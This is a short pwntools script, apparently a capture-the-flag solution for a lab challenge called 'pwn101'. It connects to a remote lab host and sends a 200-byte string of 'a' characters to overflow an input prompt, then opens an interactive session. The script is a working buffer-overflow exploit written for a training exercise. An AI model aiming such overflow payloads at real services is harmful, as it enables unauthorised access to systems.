from pwn import *

#p = process('./pwn101.pwn101')
p = remote("10.10.234.36", 9001)

p.sendlineafter(b"Type the required ingredients to make briyani:", b"a"*200)
p.interactive()